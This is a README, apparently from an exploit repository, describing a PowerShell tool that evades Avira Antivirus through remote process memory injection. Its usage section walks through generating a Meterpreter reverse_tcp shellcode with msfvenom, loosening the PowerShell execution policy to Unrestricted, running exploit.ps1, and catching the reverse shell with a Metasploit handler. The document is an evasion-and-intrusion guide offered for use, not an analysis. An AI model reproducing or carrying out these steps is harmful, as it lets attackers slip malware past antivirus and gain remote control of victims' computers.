# Bypass-Avira_Antivirus - Memory Evasion via Remote Process Memory Injection (Powershell)

Description

 Bypass Avira Antivirus version 15.0.34.16-17570 using memory evasion techniques, specifically remote process memory injection. By using this technique, it becomes possible to execute a custom shellcode undetected by Avira Antivirus

Usage

1. Download Avira Antivirus version 15.0.34.16-17570: The software can be downloaded from [this link](https://www.filepuma.com/download/avira_free_antivirus_15.0.34.16-17570/download/).

2. Create a custom shell using Metasploit's msfvenom:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<port_you_listen> -f powershell

3. Insert the generated shellcode into exploit.ps1.

4. Before running the script, check the current Execution Policy:

powershell Get-ExecutionPolicy -Scope CurrentUser

5. If necessary, set the Execution Policy to Unrestricted:

powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

6. Check the Execution Policy again to ensure it has been set correctly.

7. Execute the exploit by running exploit.ps1 in Powershell:

powershell ./exploit.ps1

8. Listen for the incoming shell using Metasploit:

msfconsole

use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST <your_ip>

set LPORT <port_you_listen>

run
